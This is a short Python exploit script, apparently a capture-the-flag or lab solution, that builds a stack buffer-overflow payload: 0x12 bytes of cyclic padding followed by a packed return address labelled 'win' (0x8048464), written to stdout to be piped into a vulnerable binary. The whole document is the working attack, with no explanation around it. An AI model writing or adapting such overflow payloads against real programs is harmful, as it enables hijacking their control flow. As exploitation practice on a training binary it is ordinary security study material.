#!/usr/bin/env python3
import struct
import sys
from pwnpy.pwn import *

win = struct.pack('I', 0x8048464)

buf = b''

buf += create_pattern(0x12)
buf += win

buf += b'\n'

sys.stdout.buffer.write(buf)
sys.stdout.flush()
